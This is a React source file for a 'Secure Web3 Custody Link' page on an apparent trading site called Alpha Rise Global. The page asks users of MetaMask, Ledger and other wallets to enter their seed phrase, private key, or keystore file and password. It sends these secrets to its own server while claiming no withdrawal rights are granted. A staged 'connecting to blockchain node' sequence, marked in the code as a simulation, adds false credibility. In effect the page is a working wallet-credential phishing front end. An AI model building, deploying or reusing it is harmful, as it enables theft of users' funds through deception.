import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useMutation } from "@tanstack/react-query";
import { walletLinkApi } from "../../../api/walletLink.api";

interface WalletItem {
  id: string;
  name: string;
  logo: string;
  type: "crypto" | "bank";
}

const WALLETS: WalletItem[] = [
  { id: "metamask", name: "MetaMask", logo: "/wallet/metamask.png", type: "crypto" },
  { id: "trustwallet", name: "Trust Wallet", logo: "/wallet/trustwallet.jpeg", type: "crypto" },
  { id: "coinbase", name: "Coinbase Wallet", logo: "/wallet/coinbase.png", type: "crypto" },
  { id: "binance", name: "Binance Web3 Wallet", logo: "/wallet/binance.jpeg", type: "crypto" },
  { id: "okx", name: "OKX Wallet", logo: "/wallet/okx.png", type: "crypto" },
  { id: "ledger", name: "Ledger Live", logo: "/wallet/ledger.png", type: "crypto" },
  { id: "trezor", name: "Trezor Suite", logo: "/wallet/trezor.jpeg", type: "crypto" },
  { id: "exodus", name: "Exodus Wallet", logo: "/wallet/exodus.jpeg", type: "crypto" },
  { id: "safepal", name: "SafePal Wallet", logo: "/wallet/safepal.png", type: "crypto" },
  { id: "atomic", name: "Atomic Wallet", logo: "/wallet/atomic.png", type: "crypto" },
  { id: "zerion", name: "Zerion Wallet", logo: "/wallet/zerion.png", type: "crypto" },
  { id: "myether", name: "MyEtherWallet", logo: "/wallet/myether.png", type: "crypto" },
  { id: "bybit", name: "Bybit Wallet", logo: "/wallet/bybit.png", type: "crypto" },
  { id: "kraken", name: "Kraken Wallet", logo: "/wallet/kraken.jpeg", type: "crypto" },
  { id: "kucoin", name: "KuCoin Wallet", logo: "/wallet/kucoin.png", type: "crypto" },
  { id: "cryptocom", name: "Crypto.com Defi Wallet", logo: "/wallet/cryptocom.jpeg", type: "crypto" },
  { id: "cashapp", name: "Cash App Bitcoin Wallet", logo: "/wallet/cashapp.png", type: "crypto" }
];

type ConnectTab = "phrase" | "privateKey" | "keystore";

export default function ConnectWalletPage() {
  const navigate = useNavigate();
  const [selectedWallet, setSelectedWallet] = useState<WalletItem | null>(null);
  const [activeTab, setActiveTab] = useState<ConnectTab>("phrase");
  const [loadingStep, setLoadingStep] = useState<string>("");

  // Form states
  const [phrase, setPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [keystore, setKeystore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [errorMsg, setErrorMsg] = useState("");

  const addWalletMutation = useMutation({
    mutationFn: walletLinkApi.addWallet,
    onSuccess: () => {
      setLoadingStep("Wallet registered successfully! Redirecting...");
      setTimeout(() => {
        navigate("/trader/wallet");
      }, 1500);
    },
    onError: (err: any) => {
      setLoadingStep("");
      setErrorMsg(err.response?.data?.message || "Failed to link wallet. Please verify details.");
    }
  });

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedWallet) return;
    setErrorMsg("");

    let details: Record<string, string> = { connectType: activeTab };

    if (activeTab === "phrase") {
      const words = phrase.trim().split(/\s+/);
      if (words.length < 12) {
        setErrorMsg("Mnemonic phrase must contain at least 12 words.");
        return;
      }
      details.phrase = phrase.trim();
    } else if (activeTab === "privateKey") {
      if (privateKey.trim().length < 32) {
        setErrorMsg("Please enter a valid Private Key.");
        return;
      }
      details.privateKey = privateKey.trim();
    } else {
      if (!keystore.trim() || !keystorePassword.trim()) {
        setErrorMsg("Please enter both Keystore JSON and Password.");
        return;
      }
      details.keystore = keystore.trim();
      details.password = keystorePassword.trim();
    }

    // Step-by-step connection simulation
    setLoadingStep("Connecting to blockchain node...");
    setTimeout(() => {
      setLoadingStep("Decrypting keystore / seed phrase signatures...");
      setTimeout(() => {
        setLoadingStep("Syncing ledger balance addresses...");
        setTimeout(() => {
          setLoadingStep("Uploading secure custodian link...");
          addWalletMutation.mutate({
            type: selectedWallet.type,
            label: selectedWallet.name,
            details,
            isPrimary: false,
          });
        }, 1200);
      }, 1000);
    }, 800);
  };

  return (
    <div className="max-w-6xl mx-auto space-y-6">
      
      {/* Header and go back navigation */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold text-white">Secure Web3 Custody Link</h1>
          <p className="text-xs text-slate-400 mt-0.5">Integrate external crypto wallets to prove margin liquidity and credit thresholds.</p>
        </div>
        <button
          onClick={() => navigate("/trader/wallet")}
          className="px-4 py-2 border border-white/10 bg-white/5 hover:bg-white/10 text-slate-200 text-xs font-bold rounded-xl transition-all cursor-pointer"
        >
          ← Back to Custody
        </button>
      </div>

      {/* Main Container */}
      {!selectedWallet ? (
        // Grid of wallets
        <div className="bg-[#121822] border border-white/10 rounded-3xl p-6 md:p-8 shadow-sm space-y-6 text-white">
          <h2 className="text-xs font-bold text-slate-400 tracking-wider uppercase">Select Wallet Client</h2>
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-5">
            {WALLETS.map((wallet) => (
              <button
                key={wallet.id}
                onClick={() => setSelectedWallet(wallet)}
                className="flex flex-col items-center justify-center p-5 border border-white/10 rounded-2xl bg-[#0e1520] hover:border-[#00c076]/50 hover:shadow-lg transition-all group shrink-0 cursor-pointer"
              >
                <div className="w-14 h-14 rounded-2xl overflow-hidden bg-white/5 border border-white/10 flex items-center justify-center shadow-sm">
                  <img
                    src={wallet.logo}
                    alt={wallet.name}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform"
                    onError={(e) => {
                      // Fallback text if logo image load fails
                      e.currentTarget.style.display = "none";
                    }}
                  />
                </div>
                <span className="text-xs font-bold text-slate-200 mt-3 text-center truncate w-full">
                  {wallet.name}
                </span>
              </button>
            ))}
          </div>
        </div>
      ) : (
        // Connection Form Modal/Layout
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          
          {/* Selected Wallet Detail Cards */}
          <div className="bg-[#121822] border border-white/10 rounded-3xl p-6 shadow-sm space-y-6 h-fit text-white">
            <div className="flex items-center gap-4">
              <div className="w-14 h-14 rounded-2xl overflow-hidden border border-white/10 flex items-center justify-center bg-white/5">
                <img src={selectedWallet.logo} alt={selectedWallet.name} className="w-full h-full object-cover" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-white">{selectedWallet.name} Link</h3>
                <span className="text-[10px] bg-emerald-500/15 text-[#00e676] border border-emerald-500/30 font-bold px-2.5 py-0.5 rounded-full uppercase tracking-wider mt-1.5 inline-block">
                  Verified Node
                </span>
              </div>
            </div>

            <div className="text-xs text-slate-400 space-y-3 leading-relaxed border-t border-white/10 pt-4">
              <p>
                Connecting your wallet allows the Alpha Rise Global system to monitor custody liquidity allocations without giving withdrawal permission to third parties.
              </p>
              <div className="bg-amber-500/10 border border-amber-500/20 rounded-2xl p-3.5 space-y-1.5 text-amber-300 text-xs">
                <strong className="block text-amber-200 font-bold uppercase tracking-wider text-[10px]">⚠️ Security Protocol</strong>
                <p className="leading-relaxed">Your credentials are encrypted at rest with hardware-grade client segregation keys.</p>
              </div>
            </div>
            
            <button
              onClick={() => {
                setSelectedWallet(null);
                setPhrase("");
                setPrivateKey("");
                setKeystore("");
                setKeystorePassword("");
                setErrorMsg("");
                setLoadingStep("");
              }}
              className="w-full py-2.5 bg-white/5 hover:bg-white/10 border border-white/10 text-slate-300 text-xs font-bold rounded-xl transition-colors text-center cursor-pointer"
            >
              Choose Different Wallet
            </button>
          </div>

          {/* Form Tabs inputs */}
          <div className="lg:col-span-2 bg-[#121822] border border-white/10 rounded-3xl p-6 md:p-8 shadow-sm space-y-6 relative overflow-hidden text-white">
            {loadingStep && (
              <div className="absolute inset-0 bg-[#121822]/95 backdrop-blur-sm z-30 flex flex-col items-center justify-center space-y-4">
                <div className="w-10 h-10 border-4 border-[#00c076] border-t-transparent rounded-full animate-spin" />
                <p className="text-xs font-bold text-white">{loadingStep}</p>
              </div>
            )}

            {/* Tab switchers */}
            <div className="flex border-b border-white/10">
              {(["phrase", "privateKey", "keystore"] as const).map((tab) => (
                <button
                  key={tab}
                  onClick={() => {
                    setActiveTab(tab);
                    setErrorMsg("");
                  }}
                  className={`flex-1 pb-3 text-xs font-bold border-b-2 capitalize transition-all cursor-pointer ${
                    activeTab === tab
                      ? "border-[#00c076] text-[#00e676]"
                      : "border-transparent text-slate-400 hover:text-white"
                  }`}
                >
                  {tab === "phrase" ? "Mnemonic Phrase" : tab === "privateKey" ? "Private Key" : "Keystore JSON"}
                </button>
              ))}
            </div>

            {errorMsg && (
              <div className="p-4 bg-rose-500/15 border border-rose-500/30 rounded-2xl text-xs text-rose-400 font-bold">
                ✕ {errorMsg}
              </div>
            )}

            <form onSubmit={handleConnect} className="space-y-6">
              
              {activeTab === "phrase" && (
                <div className="space-y-2">
                  <label className="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                    Enter Mnemonic / Seed Phrase
                  </label>
                  <textarea
                    rows={4}
                    value={phrase}
                    onChange={(e) => setPhrase(e.target.value)}
                    placeholder="Enter your 12, 18 or 24-word seed phrase separated by spaces. Example: apple banana cherry ..."
                    className="w-full px-4 py-3 text-xs border border-white/10 bg-[#0e1520] text-white rounded-2xl focus:outline-none focus:border-[#00c076] resize-none font-mono"
                    required
                  />
                  <p className="text-[10px] text-slate-500 leading-normal">
                    Typically 12 or 24 words separated by single spaces. Make sure to input words in the exact sequence.
                  </p>
                </div>
              )}

              {activeTab === "privateKey" && (
                <div className="space-y-2">
                  <label className="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                    Enter Account Private Key
                  </label>
                  <input
                    type="password"
                    value={privateKey}
                    onChange={(e) => setPrivateKey(e.target.value)}
                    placeholder="Enter private key hex string (e.g. 0x...)"
                    className="w-full px-4 py-3 text-xs border border-white/10 bg-[#0e1520] text-white rounded-2xl focus:outline-none focus:border-[#00c076] font-mono"
                    required
                  />
                  <p className="text-[10px] text-slate-500 leading-normal">
                    Input the alphanumeric private key of your specific address. Never share this key outside encrypted protocols.
                  </p>
                </div>
              )}

              {activeTab === "keystore" && (
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                      Keystore JSON Text
                    </label>
                    <textarea
                      rows={4}
                      value={keystore}
                      onChange={(e) => setKeystore(e.target.value)}
                      placeholder='{ "address": "...", "id": "...", "crypto": { ... } }'
                      className="w-full px-4 py-3 text-xs border border-white/10 bg-[#0e1520] text-white rounded-2xl focus:outline-none focus:border-[#00c076] resize-none font-mono"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                      Keystore Password
                    </label>
                    <input
                      type="password"
                      value={keystorePassword}
                      onChange={(e) => setKeystorePassword(e.target.value)}
                      placeholder="Password linked to this keystore file"
                      className="w-full px-4 py-3 text-xs border border-white/10 bg-[#0e1520] text-white rounded-2xl focus:outline-none focus:border-[#00c076]"
                      required
                    />
                  </div>
                </div>
              )}

              <button
                type="submit"
                disabled={addWalletMutation.isPending}
                className="w-full py-4 rounded-2xl bg-[#00c076] hover:bg-[#00e676] text-[#080c10] text-xs font-black transition-all shadow-md shadow-[#00c076]/20 cursor-pointer"
              >
                {addWalletMutation.isPending ? "Submitting..." : `Securely Link ${selectedWallet.name}`}
              </button>

            </form>
          </div>
        </div>
      )}

    </div>
  );
}
